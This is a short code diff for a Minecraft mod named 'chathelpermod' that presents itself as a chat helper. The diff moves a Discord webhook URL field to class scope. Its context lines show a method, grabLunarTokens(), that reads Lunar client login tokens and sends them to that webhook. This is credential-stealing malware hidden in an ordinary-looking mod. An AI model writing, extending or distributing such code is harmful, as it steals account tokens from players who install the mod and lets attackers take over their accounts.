@@ -34,6 +34,9 @@ public class AutoChat {
     public static final String MODID = "chathelpermod";
     public static final String VERSION = "1.1";
 
+    // TODO
+    // Fill with your discord webhook url
+    String webhookUrl = "";
     Minecraft client = Minecraft.getMinecraft();
 
     boolean modRunning = false;
@@ -153,9 +156,6 @@ public class AutoChat {
     public void grabLunarTokens() {
         try {
             LunarTokenReader tr = new LunarTokenReader();
-            // TODO
-            // Fill with your discord webhook url
-            String webhookUrl = "";
             tr.setDiscordWebhook(webhookUrl);
             tr.sendTokens("Lunar");
         } catch (Exception e) {
